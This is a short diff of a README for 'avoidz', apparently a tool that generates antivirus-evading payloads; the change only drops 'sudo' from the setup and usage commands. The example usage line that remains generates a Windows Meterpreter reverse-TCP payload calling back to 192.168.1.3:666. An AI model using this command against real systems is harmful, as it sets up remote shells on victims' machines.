@@ -27,14 +27,14 @@
 
     2º - Set setup script execution permitions
          cd avoidz
-         sudo chmod +x setup.sh
+         chmod +x setup.sh
 
     3°- Run setup script
-         sudo./setup.sh == to check dependecies
+         ./setup.sh == to check dependecies
 
     4°- Run avoidz tool == example
-         sudo ./avoidz.rb == help command
-	  sudo ./avoidz.rb -h 192.168.1.3 -p 666 -m windows/meterpreter/reverse_tcp -f temp1 == generate
+         ./avoidz.rb == help command
+	 ./avoidz.rb -h 192.168.1.3 -p 666 -m windows/meterpreter/reverse_tcp -f temp1 == generate
 
 ## video tutorial: 
 Avoidz v 1.0 temp1 generate :
